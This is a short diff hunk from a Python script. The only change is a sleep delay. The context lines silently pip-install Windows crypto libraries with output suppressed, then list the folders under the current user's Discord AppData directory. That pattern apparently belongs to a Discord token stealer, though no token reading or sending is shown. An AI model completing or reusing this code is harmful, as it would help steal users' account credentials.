@@ -9,7 +9,7 @@ except ImportError as e:
     finally:
        subprocess.run(f"pip install pycryptodome pypiwin32 pycryptodomex pywin32", stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
 
-time.sleep(3)
+time.sleep(2)
 user = os.getlogin()
 path = f"C:/Users/{user}/APPDATA/Local/Discord/"
 dirr = [f for f in os.listdir(path) if os.path.isdir(os.path.join(path, f))]
